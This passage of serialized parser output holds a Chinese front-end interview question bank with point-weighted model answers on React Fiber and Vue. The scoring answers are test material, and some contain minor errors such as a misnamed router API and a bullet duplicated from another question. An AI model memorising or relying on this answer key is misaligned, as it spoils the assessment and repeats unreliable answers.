componentWillUnmount 的结合；不设置时，每次组件渲染\\n后 useEffect 都会执行，可能导致不必要的副作用反复运行。","text":" 为空数组时，useEffect 仅在组件挂载和卸载时执行一次，类似 componentDidMount 与 componentWillUnmount 的结合；不设置时，每次组件渲染\\n后 useEffect 都会执行，可能导致不必要的副作用反复运行。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 说说对Fiber架构的理解？解决了什么问题？\\n\\n","depth":2,"text":"说说对Fiber架构的理解？解决了什么问题？","tokens":[{"type":"text","raw":"说说对Fiber架构的理解？解决了什么问题？","text":"说说对Fiber架构的理解？解决了什么问题？","escaped":false}]},{"type":"heading","raw":"#### 类型：`编程`\\n\\n","depth":4,"text":"类型：`编程`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`编程`","text":"编程"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"paragraph","raw":"在react中，主要做了以下的操作：","text":"在react中，主要做了以下的操作：","tokens":[{"type":"text","raw":"在react中，主要做了以下的操作：","text":"在react中，主要做了以下的操作：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **1：** 为每个增加了优先级，优先级高的任务可以中断低优先级的任务。然后再重新，注意是重新执行优先级低的任务\\n- **1：** 增加了异步任务，调用requestIdleCallback api，浏览器空闲的时候执行\\n- **1：** dom diff树变成了链表，一个dom对应两个fiber（一个链表），对应两个队列，这都是为找到被中断的任务，重新执行\\n- **1：** Fiber把渲染更新过程拆分成多个子任务，每次只做一小部分，做完看是否还有剩余时间，如果有继续下一个任务；如果没有，挂起当前任务，将时间控制权交给主线程，等主线程不忙的时候在继续执行，即可以中断与恢复，恢复后也可以复用之前的中间状态，并给不同的任务赋予不同的优先级，其中每个任务更新单元为 React Element 对应的 Fiber节点","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 为每个增加了优先级，优先级高的任务可以中断低优先级的任务。然后再重新，注意是重新执行优先级低的任务\\n","task":false,"loose":false,"text":"**1：** 为每个增加了优先级，优先级高的任务可以中断低优先级的任务。然后再重新，注意是重新执行优先级低的任务","tokens":[{"type":"text","raw":"**1：** 为每个增加了优先级，优先级高的任务可以中断低优先级的任务。然后再重新，注意是重新执行优先级低的任务","text":"**1：** 为每个增加了优先级，优先级高的任务可以中断低优先级的任务。然后再重新，注意是重新执行优先级低的任务","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 为每个增加了优先级，优先级高的任务可以中断低优先级的任务。然后再重新，注意是重新执行优先级低的任务","text":" 为每个增加了优先级，优先级高的任务可以中断低优先级的任务。然后再重新，注意是重新执行优先级低的任务","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 增加了异步任务，调用requestIdleCallback api，浏览器空闲的时候执行\\n","task":false,"loose":false,"text":"**1：** 增加了异步任务，调用requestIdleCallback api，浏览器空闲的时候执行","tokens":[{"type":"text","raw":"**1：** 增加了异步任务，调用requestIdleCallback api，浏览器空闲的时候执行","text":"**1：** 增加了异步任务，调用requestIdleCallback api，浏览器空闲的时候执行","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 增加了异步任务，调用requestIdleCallback api，浏览器空闲的时候执行","text":" 增加了异步任务，调用requestIdleCallback api，浏览器空闲的时候执行","escaped":false}]}]},{"type":"list_item","raw":"- **1：** dom diff树变成了链表，一个dom对应两个fiber（一个链表），对应两个队列，这都是为找到被中断的任务，重新执行\\n","task":false,"loose":false,"text":"**1：** dom diff树变成了链表，一个dom对应两个fiber（一个链表），对应两个队列，这都是为找到被中断的任务，重新执行","tokens":[{"type":"text","raw":"**1：** dom diff树变成了链表，一个dom对应两个fiber（一个链表），对应两个队列，这都是为找到被中断的任务，重新执行","text":"**1：** dom diff树变成了链表，一个dom对应两个fiber（一个链表），对应两个队列，这都是为找到被中断的任务，重新执行","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" dom diff树变成了链表，一个dom对应两个fiber（一个链表），对应两个队列，这都是为找到被中断的任务，重新执行","text":" dom diff树变成了链表，一个dom对应两个fiber（一个链表），对应两个队列，这都是为找到被中断的任务，重新执行","escaped":false}]}]},{"type":"list_item","raw":"- **1：** Fiber把渲染更新过程拆分成多个子任务，每次只做一小部分，做完看是否还有剩余时间，如果有继续下一个任务；如果没有，挂起当前任务，将时间控制权交给主线程，等主线程不忙的时候在继续执行，即可以中断与恢复，恢复后也可以复用之前的中间状态，并给不同的任务赋予不同的优先级，其中每个任务更新单元为 React Element 对应的 Fiber节点","task":false,"loose":false,"text":"**1：** Fiber把渲染更新过程拆分成多个子任务，每次只做一小部分，做完看是否还有剩余时间，如果有继续下一个任务；如果没有，挂起当前任务，将时间控制权交给主线程，等主线程不忙的时候在继续执行，即可以中断与恢复，恢复后也可以复用之前的中间状态，并给不同的任务赋予不同的优先级，其中每个任务更新单元为 React Element 对应的 Fiber节点","tokens":[{"type":"text","raw":"**1：** Fiber把渲染更新过程拆分成多个子任务，每次只做一小部分，做完看是否还有剩余时间，如果有继续下一个任务；如果没有，挂起当前任务，将时间控制权交给主线程，等主线程不忙的时候在继续执行，即可以中断与恢复，恢复后也可以复用之前的中间状态，并给不同的任务赋予不同的优先级，其中每个任务更新单元为 React Element 对应的 Fiber节点","text":"**1：** Fiber把渲染更新过程拆分成多个子任务，每次只做一小部分，做完看是否还有剩余时间，如果有继续下一个任务；如果没有，挂起当前任务，将时间控制权交给主线程，等主线程不忙的时候在继续执行，即可以中断与恢复，恢复后也可以复用之前的中间状态，并给不同的任务赋予不同的优先级，其中每个任务更新单元为 React Element 对应的 Fiber节点","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Fiber把渲染更新过程拆分成多个子任务，每次只做一小部分，做完看是否还有剩余时间，如果有继续下一个任务；如果没有，挂起当前任务，将时间控制权交给主线程，等主线程不忙的时候在继续执行，即可以中断与恢复，恢复后也可以复用之前的中间状态，并给不同的任务赋予不同的优先级，其中每个任务更新单元为 React Element 对应的 Fiber节点","text":" Fiber把渲染更新过程拆分成多个子任务，每次只做一小部分，做完看是否还有剩余时间，如果有继续下一个任务；如果没有，挂起当前任务，将时间控制权交给主线程，等主线程不忙的时候在继续执行，即可以中断与恢复，恢复后也可以复用之前的中间状态，并给不同的任务赋予不同的优先级，其中每个任务更新单元为 React Element 对应的 Fiber节点","escaped":false}]}]}]}]},{"key":"Vue","content":"<h1>Vue</h1>\\n<h2>vue3和vue2的区别</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（11 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 源码组织方式变化：使用 TS 重写</li>\\n<li><strong>1：</strong> 支持 Composition API：基于函数的API，更加灵活组织组件逻辑（vue2用的是options api）</li>\\n<li><strong>1：</strong> 响应式系统提升：Vue3中响应式数据原理改成proxy，可监听动态新增删除属性，以及数组变化</li>\\n<li><strong>1：</strong> 编译优化：vue2通过标记静态根节点优化diff，Vue3 标记和提升所有静态根节点，diff的时候只需要对比动态节点内容</li>\\n<li><strong>1：</strong> 打包体积优化：移除了一些不常用的api（inline-template、filter）</li>\\n<li><strong>1：</strong> 生命周期的变化：使用setup代替了之前的beforeCreate和created</li>\\n<li><strong>1：</strong> Vue3 的 template 模板支持多个根标签</li>\\n<li><strong>1：</strong> Vuex状态管理：创建实例的方式改变,Vue2为new Store , Vue3为createStore</li>\\n<li><strong>1：</strong> Route 获取页面实例与路由信息：vue2通过this获取router实例，vue3通过使用 getCurrentInstance/ userRoute和userRouter方法获取当前组件实例</li>\\n<li><strong>1：</strong> Props 的使用变化：vue2 通过 this 获取 props 里面的内容，vue3 直接通过 props</li>\\n<li><strong>1：</strong> 父子组件传值：vue3 在向父组件传回数据时，如使用的自定义名称，如 backData，则需要在 emits 中定义一下</li>\\n</ul>\\n<h2>watch 和 watchEffect 的区别？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3分）</h4>\\n<ul>\\n<li><strong>1：</strong> watch ：既要指明监视的数据源，也要指明监视的回调。</li>\\n<li><strong>1：</strong> watchEffect 可以自动监听数据源作为依赖。不用指明监视哪个数据，监视的回调中用到哪个数据，那就监视哪个数据。</li>\\n<li><strong>1：</strong> watch 可以访问改变之前和之后的值，watchEffect 只能获取改变后的值。</li>\\n</ul>\\n<h2>在 Vue2.x 中如何检测数组的变化？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1分）</h4>\\n<ul>\\n<li><strong>1：</strong> 使用了函数劫持的方式，重写了数组的方法，Vue将data中的数组进行了原型链重写，指向了自己定义的数组原型方法。这样当调用数组api时，可以通知依赖更新。如果数组中包含着引用类型，会对数组中的引用类型再次递归遍历进行监控。这样就实现了监测数组变化。</li>\\n</ul>\\n<h2>在 v-if 与 v-show 的区别？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1分）</h4>\\n<ul>\\n<li><strong>1：</strong> 当条件不成立时，v-if不会渲染DOM元素，v-show操作的是样式(display)，切换当前DOM的显示和隐藏。</li>\\n</ul>\\n<h2>如何实现 Vue 组件的插槽（slot）？有哪些类型的插槽？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1分）</h4>\\n<ul>\\n<li><strong>1：</strong> 默认插槽、具名插槽、作用域插槽</li>\\n</ul>\\n<h2>简述 Vuex 的核心概念和工作流程</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2分）</h4>\\n<ul>\\n<li><strong>1：</strong> 核心概念:<br/>\\n&emsp;State：存储应用的状态数据，是一个单一的数据源，所有组件都可以访问, <br/>\\n&emsp;Mutations：用于同步修改 State 中的数据。\\n是唯一允许修改 State 的地方，它接收 State 作为第一个参数。<br>\\n&emsp;Actions：用于处理异步操作，如异步数据获取等，它不能直接修改 State，而是通过提交 Mutations 来间接修改。<br/>\\n&emsp;Getters(类似于计算属性，用于从 State 中派生出一些新的数据，方便组件获取和使用)</li>\\n<li><strong>1：</strong> 工作流程：<br/>组件通过 dispatch 方法触发 Actions，Actions 中可以进行异步操作，然后通过 commit 提交 Mutations，\\nMutations 同步修改 State 的数据，组件可以通过 mapState、mapGetters 等辅助函数获取 State 和 Getters 中的数据，从而实现数据的响应式变化\\n和组件的更新。</li>\\n</ul>\\n<h2>Vue项目中如何进行性能优化？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（10分）</h4>\\n<details>\\n\\n<ul>\\n<li><strong>1：</strong> 合理使用v-show和v-if：<br/>\\n&emsp;原理：v-if是真正的条件渲染，它会在条件为假时销毁组件，在条件为真时重新创建组件，这涉及到 DOM 元素的销毁和重建过程。\\n而v - show只是简单地切换元素的CSS的display属性，组件的 DOM 元素始终存在于文档中。<br/>\\n&emsp;应用场景：对于那些在运行时很少改变显示状态的组件，比如用户权限相关的组件，只有管理员才能看到的功能组件，使用v-if比较合适。\\n对于频繁切换显示隐藏状态的组件，如页面中的导航栏下拉菜单，使用v-show能减少组件的销毁和重建带来的性能损耗。<br></li>\\n<li><strong>1：</strong> 优化组件的props和events传递：<br/>\\n&emsp;原理：当组件的props发生变化时，组件会重新渲染。如果传递了不必要的props或者过于复杂的数据结构作为props，会增加组\\n件重新渲染的概率和成本。同样，过多的$emit事件也可能导致组件之间通信过于复杂，影响性能。<br/>\\n&emsp;应用场景：只传递组件真正需要的数据作为props。例如，一个列表组件只需要接收列表数据和展示格式相关的参数，而不需要接收整个应\\n用的状态数据。在组件内部，对于复杂的数据结构作为props，可以考虑使用Object.freeze()来冻结数据，防止在组件内部意外修改导致重新渲染。\\n对于$emit事件，只在必要时使用，并且确保事件名称清晰明了，避免过多的、不必要的事件通信。</li>\\n<li><strong>1：</strong> 使用keep-alive缓存组件:<br/>\\n&emsp;原理：keep-alive是 Vue 提供的一个内置组件，它能够缓存包裹在其中的组件。当组件被缓存时，再次激活这个组件时不会重新创建和\\n初始化，而是直接从缓存中取出，保留了组件之前的状态，从而减少了组件重新创建和渲染的开销。<br/>\\n&emsp;应用场景：适用于那些频繁切换但数据变化不大的组件。比如在一个多步骤表单应用中，用户在各个步骤之间来回切换，使用keep-alive包裹\\n表单步骤组件，可以避免每次切换步骤都重新创建表单组件，提高用户体验和应用性能。</li>\\n<li><strong>1：</strong> 列表渲染优化: 为v-for列表添加key属性<br/>\\n&emsp;原理：key属性是 Vue 用于识别v - for循环中的每个节点的唯一标识。当列表数据发生变化时，Vue 会根据key属性来更精准地判断哪些节点需要\\n更新、移动、添加或删除。如果没有key属性或者key属性不唯一，Vue 可能会进行不必要的 DOM 操作，导致性能下降。<br/>\\n&emsp;应用场景：在任何使用v - for进行列表渲染的地方都应该添加key属性。例如，渲染一个商品列表时，使用商品的唯一ID作为key</li>\\n<li><strong>2：</strong> 数据响应式优化: 避免过度的响应式数据<br/>\\n&emsp;原理：Vue 的响应式系统是通过Object.defineProperty()（在 Vue 3 中也有Proxy方式）对数据进行劫持来实现的。如果一个对象包含大量的数据，\\n并且这些数据大部分在组件的生命周期内都不会发生变化，将所有数据都设置为响应式会增加不必要的性能开销。<br/>\\n&emsp;应用场景：对于那些不需要响应式的数据，可以将其定义在组件的data属性之外。例如，一个组件中有一些常量数据，如固定的颜色列表、图标列表等，可以将\\n这些数据定义为普通的 JavaScript 对象，而不是放在data属性中。在 Vue 3 中，还可以使用shallowReactive或shallowRef来创建浅层响应式数据，只\\n对对象的第一层数据进行响应式处理，减少性能消耗。</li>\\n<li><strong>2：</strong> 路由层面优化: 路由懒加载<br/>\\n&emsp;原理：路由懒加载可以将路由对应的组件分割成不同的代码块，只有在访问该路由时才会加载对应的组件代码。这样可以减少应用初始加载时的代码体积，加\\n快首屏加载速度。<br/>\\n&emsp;应用场景：对于大型的单页面应用（SPA），尤其是包含多个页面或功能模块的应用，如一个电商应用中的商品详情页、购物车页、个人中心页等，都可以采用路由懒\\n加载的方式。在 Vue Router 中，可以使用动态import来实现路由懒加载，例如const ProductDetail = () =&gt; import(&#39;./views/ProductDetail.vue&#39;)，在\\n路由配置中{ path: &#39;/product - detail&#39;, component: ProductDetail }。</li>\\n<li><strong>1：</strong> 代码压缩和混淆（Webpack 相关）<br/>\\n&emsp;原理：在构建过程中，通过工具（如terser-webpack-plugin）对 JavaScript 代码进行压缩和混淆，可以减小代码文件的大小。压缩是去除代码中的空格、注\\n释等冗余信息，混淆是将代码中的变量名、函数名等替换为更短的、难以理解的名称，从而减少代码体积，加快下载速度。<br/></li>\\n<li><strong>1：</strong> 合理设置chunk大小和数量（Webpack 相关）<br/>\\n&emsp;原理：chunk是webpack在打包过程中生成的代码块。合理设置chunk的大小和数量可以更好地利用浏览器的缓存机制，减少重复请求，提高加载效率。如果chunk过\\n大，可能会导致加载时间过长；如果chunk过小，会产生过多的请求，增加请求开销。<br/>\\n&emsp;应用场景：根据应用的模块划分和功能需求来设置chunk。例如，可以将公共的库代码（如Vue、Vuex、Vue Router等）打包成一个单独的chunk，将不同业务模块\\n的代码分别打包成其他chunk。在webpack配置中，可以通过splitChunks配置项来控制chunk的生成，例如：</li>\\n</ul>\\n<pre><code class=\\"language-js\\">module.exports = {\\n  optimization: {\\n    splitChunks: {\\n      chunks: &#39;all&#39;,\\n      minSize: 30000,\\n      maxSize: 0,\\n      minChunks: 1,\\n      maxAsyncRequests: 5,\\n      maxInitialRequests: 3,\\n      automaticNamePrefix: &#39;chunk - &#39;,\\n      cacheGroups: {\\n        vendors: {\\n          test: /[\\\\\\\\/]node_modules[\\\\\\\\/]/,\\n          priority: - 10\\n        },\\n        default: {\\n          minChunks: 2,\\n          priority: - 20,\\n          reuseExistingChunk: true\\n        }\\n      }\\n    }\\n  }\\n};\\n</code></pre>\\n</details>\\n\\n<h2>v-model 双向绑定的原理是什么？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1分）</h4>\\n<ul>\\n<li><strong>1：</strong> v-model本质就是一个语法糖，可以看成是value + input方法的语法糖。 可以通过model属性的prop和event属性来进行自定义。原生的v-model，会根据标签的不同生成不同的事件和属性 。</li>\\n</ul>\\n<h2>在  v-if 和 v-for 的优先级哪个高？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1分）</h4>\\n<ul>\\n<li><strong>1：</strong> 在 vue2 中 v-for 的优先级更高，但是在 vue3 中优先级改变了。v-if 的优先级更高。</li>\\n</ul>\\n<h2>ref与reactive的区别？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（6分）</h4>\\n<ul>\\n<li><strong>1：</strong> ref与reactive 是 Vue3 新推出的主要 API 之一，它们主要用于响应式数据的创建。</li>\\n<li><strong>1：</strong> ref 函数创建的响应式数据，在模板中可以直接被使用，在 JS 中需要通过 .value 的形式才能使用。</li>\\n<li><strong>1：</strong> ref 函数可以接收原始数据类型与引用数据类型。</li>\\n<li><strong>1：</strong> reactive 函数只能接收引用数据类型。</li>\\n<li><strong>1：</strong> ref 底层还是使用 reactive 来做，ref 是在 reactive 上在进行了封装，增强了其能力，使它支持了对原始数据类型的处理。</li>\\n<li><strong>1：</strong> 在 Vue3 中 reactive 能做的，ref 也能做，reactive 不能做的，ref 也能做。</li>\\n</ul>\\n<h2>Vue 3 中的Teleport功能有什么作用，如何使用？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2分）</h4>\\n<ul>\\n<li><strong>2：</strong> Teleport功能可以将组件的子树 “瞬移” 到 DOM 的其他位置，不受组件层级的限制。使用时，在组件中使用 <code>&lt;teleport&gt;</code> 标签包裹需要瞬移的元素，并\\n指定to属性为目标 DOM 元素的选择器或id。例如:</li>\\n</ul>\\n<pre><code class=\\"language-js\\">&lt;teleport to=&quot;#app-root&quot;&gt;...&lt;/teleport&gt;\\n//会将包裹的元素移动到id为app-root的元素内部。\\n</code></pre>\\n<h2>如何在 Vue 3 中实现自定义指令的全局注册和局部注册？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1分）</h4>\\n<ul>\\n<li><strong>1：</strong> 全局注册在 main.js 中使用 app.directive(&#39;指令名&#39;, 指令对象)；局部注册在组件内，通过 directives: { &#39;指令名&#39;: 指令对象 }，指令对象包含\\n mounted、updated 等生命周期钩子函数用于定义指令行为。</li>\\n</ul>\\n<h2>说一下 Vue SSR 的实现原理</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><p>SSR也就是服务端渲染，也就是将Vue在客户端把标签渲染成HTML的工作放在服务端完成，然后再把html直接返回给客户端。</p>\\n</li>\\n<li><p>SSR有着更好的SEO、并且首屏加载速度更快等优点。不过它也有一些缺点，比如我们的开发条件会受到限制，服务器端渲染只支持beforeCreate和created两个钩子，当我们需要一些外部扩展库时需要特殊处理，服务端渲染应用程序也需要处于Node.js的运行环境。还有就是服务器会有更大的负载需求。</p>\\n</li>\\n</ul>\\n<h2>Vue 组件的 data 为什么必须是函数？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li>一个组件被复用多次的话，也就会创建多个实例。本质上，这些实例用的都是同一个构造函数。如果data是对象的话，对象属于引用类型，会影响到所有的实例。所以为了保证组件不同的实例之间data不冲突，data必须是一个函数。</li>\\n</ul>\\n<h2>vue 中的 spa 应用如何优化首屏加载速度?</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（5 分）</h4>\\n<ul>\\n<li><p>请求优化：CDN 将第三方的类库放到 CDN 上，能够大幅度减少生产环境中的项目体积，另外 CDN 能够实时地根据网络流量和各节点的连接、负载状况以及到用户的距离和响应时间等综合信息将用户的请求重新导向离用户最近的服务节点上。</p>\\n</li>\\n<li><p>缓存：将长时间不会改变的第三方类库或者静态资源设置为强缓存，将 max-age 设置为一个非常长的时间，再将访问路径加上哈希达到哈希值变了以后保证获取到最新资源，好的缓存策略有助于减轻服务器的压力，并且显著的提升用户的体验</p>\\n</li>\\n<li><p>gzip：开启 gzip 压缩，通常开启 gzip 压缩能够有效的缩小传输资源的大小。</p>\\n</li>\\n<li><p>http2：如果系统首屏同一时间需要加载的静态资源非常多，但是浏览器对同域名的 tcp 连接数量是有限制的(chrome 为 6 个)超过规定数量的 tcp 连接，则必须要等到之前的请求收到响应后才能继续发送，而 http2 则可以在多个 tcp 连接中并发多个请求没有限制，在一些网络较差的环境开启 http2 性能提升尤为明显。</p>\\n</li>\\n<li><p>懒加载：当 url 匹配到相应的路径时，通过 import 动态加载页面组件，这样首屏的代码量会大幅减少，webpack 会把动态加载的页面组件分离成单独的一个 chunk.js 文件</p>\\n</li>\\n<li><p>预渲染：由于浏览器在渲染出页面之前，需要先加载和解析相应的 html、css 和 js 文件，为此会有一段白屏的时间，可以添加loading，或者骨架屏幕尽可能的减少白屏对用户的影响体积优化</p>\\n</li>\\n<li><p>合理使用第三方库：对于一些第三方 ui 框架、类库，尽量使用按需加载，减少打包体积</p>\\n</li>\\n<li><p>使用可视化工具分析打包后的模块体积：webpack-bundle- analyzer 这个插件在每次打包后能够更加直观的分析打包后模块的体积，再对其中比较大的模块进行优化</p>\\n</li>\\n<li><p>提高代码使用率：利用代码分割，将脚本中无需立即调用的代码在代码构建时转变为异步加载的过程</p>\\n</li>\\n<li><p>封装：构建良好的项目架构，按照项目需求就行全局组件，插件，过滤器，指令，utils 等做一 些公共封装，可以有效减少我们的代码量，而且更容易维护资源优化</p>\\n</li>\\n<li><p>图片懒加载：使用图片懒加载可以优化同一时间减少 http 请求开销，避免显示图片导致的画面抖动，提高用户体验</p>\\n</li>\\n<li><p>使用 svg 图标：相对于用一张图片来表示图标，svg 拥有更好的图片质量，体积更小，并且不需要开启额外的 http 请求</p>\\n</li>\\n</ul>\\n<h2>组件中写 name 选项有哪些好处？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><p>可以通过名字找到对应的组件（ 递归组件：组件自身调用自身 ）</p>\\n</li>\\n<li><p>可以通过 name 属性实现缓存功能（keep-alive）</p>\\n</li>\\n<li><p>可以通过 name 来识别组件（跨级组件通信时非常重要）</p>\\n</li>\\n<li><p>使用 vue-devtools 调试工具里显示的组见名称是由 vue 中组件 name 决定的</p>\\n</li>\\n</ul>\\n<h2>说一下 ref 的作用是什么？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<p>ref 的作用是被用来给元素或子组件注册引用信息。引用信息将会注册在父组件的 $refs 对象上。其特点是：</p>\\n<ul>\\n<li><p>如果在普通的 DOM 元素上使用，引用指向的就是 DOM 元素</p>\\n</li>\\n<li><p>基本用法，本页面获取 DOM 元素</p>\\n</li>\\n<li><p>获取子组件中的 data</p>\\n</li>\\n<li><p>调用子组件中的方法</p>\\n</li>\\n<li><p>使用 vue-devtools 调试工具里显示的组见名称是由 vue 中组件 name 决定的</p>\\n</li>\\n</ul>\\n","ast":[{"type":"heading","raw":"# Vue\\n\\n","depth":1,"text":"Vue","tokens":[{"type":"text","raw":"Vue","text":"Vue","escaped":false}]},{"type":"heading","raw":"## vue3和vue2的区别\\n\\n","depth":2,"text":"vue3和vue2的区别","tokens":[{"type":"text","raw":"vue3和vue2的区别","text":"vue3和vue2的区别","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（11 分）\\n\\n","depth":4,"text":"解答（11 分）","tokens":[{"type":"text","raw":"解答（11 分）","text":"解答（11 分）","escaped":false}]},{"type":"list","raw":"* **1：** 源码组织方式变化：使用 TS 重写\\n* **1：** 支持 Composition API：基于函数的API，更加灵活组织组件逻辑（vue2用的是options api）\\n* **1：** 响应式系统提升：Vue3中响应式数据原理改成proxy，可监听动态新增删除属性，以及数组变化\\n* **1：** 编译优化：vue2通过标记静态根节点优化diff，Vue3 标记和提升所有静态根节点，diff的时候只需要对比动态节点内容\\n* **1：** 打包体积优化：移除了一些不常用的api（inline-template、filter）\\n* **1：** 生命周期的变化：使用setup代替了之前的beforeCreate和created\\n* **1：** Vue3 的 template 模板支持多个根标签\\n* **1：** Vuex状态管理：创建实例的方式改变,Vue2为new Store , Vue3为createStore\\n* **1：** Route 获取页面实例与路由信息：vue2通过this获取router实例，vue3通过使用 getCurrentInstance/ userRoute和userRouter方法获取当前组件实例\\n* **1：** Props 的使用变化：vue2 通过 this 获取 props 里面的内容，vue3 直接通过 props\\n* **1：** 父子组件传值：vue3 在向父组件传回数据时，如使用的自定义名称，如 backData，则需要在 emits 中定义一下","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"* **1：** 源码组织方式变化：使用 TS 重写\\n","task":false,"loose":false,"text":"**1：** 源码组织方式变化：使用 TS 重写","tokens":[{"type":"text","raw":"**1：** 源码组织方式变化：使用 TS 重写","text":"**1：** 源码组织方式变化：使用 TS 重写","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 源码组织方式变化：使用 TS 重写","text":" 源码组织方式变化：使用 TS 重写","escaped":false}]}]},{"type":"list_item","raw":"* **1：** 支持 Composition API：基于函数的API，更加灵活组织组件逻辑（vue2用的是options api）\\n","task":false,"loose":false,"text":"**1：** 支持 Composition API：基于函数的API，更加灵活组织组件逻辑（vue2用的是options api）","tokens":[{"type":"text","raw":"**1：** 支持 Composition 